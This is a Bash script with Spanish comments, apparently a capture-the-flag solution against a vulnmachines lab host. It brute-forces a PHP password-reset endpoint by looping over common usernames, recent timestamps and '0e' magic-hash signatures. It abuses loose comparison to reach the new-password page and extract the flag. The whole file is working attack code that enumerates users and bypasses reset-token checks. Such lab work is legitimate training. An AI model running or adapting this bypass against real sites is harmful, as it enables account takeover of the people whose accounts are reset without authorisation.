#!/bin/bash

echo "=== Testing Different Users ==="

BASE_URL="http://hackme13.vulnmachines.com:9999"
CURRENT_TIME=$(date +%s)

# Lista de usuarios comunes
USERS=("admin" "user" "test" "guest" "root" "administrator" "demo" "user1" "Admin" "ADMIN")

# Magic hashes comunes
SIGS=("0e215962" "0e730083" "0e807097" "0e001233" "0e462097" "0e516903")

echo "[*] Probando diferentes usuarios..."

for user in "${USERS[@]}"; do
    echo -e "\n[*] Probando usuario: $user"
    
    # Probar con diferentes tiempos recientes
    for offset in 0 100 200 300 400 500 1000 2000 3000; do
        TIME=$((CURRENT_TIME - offset))
        
        for sig in "${SIGS[@]}"; do
            URL="${BASE_URL}/Reset.php?user=${user}&time=${TIME}&sig=${sig}"
            
            # Verificar respuesta
            RESPONSE=$(curl -s -I "$URL")
            STATUS=$(echo "$RESPONSE" | grep "HTTP" | awk '{print $2}')
            LOCATION=$(echo "$RESPONSE" | grep -i "location:" | cut -d' ' -f2 | tr -d '\r')
            
            if [ "$STATUS" = "302" ]; then
                echo "[+] Redirección encontrada para $user!"
                echo "    Time: $TIME"
                echo "    Sig: $sig"
                echo "    Location: $LOCATION"
                
                if [[ "$LOCATION" == *"NewPass.php"* ]]; then
                    echo "[+] ¡ÉXITO! Usuario válido: $user"
                    echo "[+] URL completa: $URL"
                    
                    # Intentar obtener la flag
                    FULL_RESPONSE=$(curl -s -L "$URL")
                    if echo "$FULL_RESPONSE" | grep -o "vnm{[^}]*}" 2>/dev/null; then
                        echo "[+] ¡FLAG ENCONTRADA!"
                        exit 0
                    fi
                    
                    echo "[*] Intenta acceder manualmente a la URL"
                    exit 0
                fi
            fi
        done
    done
done

echo -e "\n[-] No se encontró un usuario válido con bypass"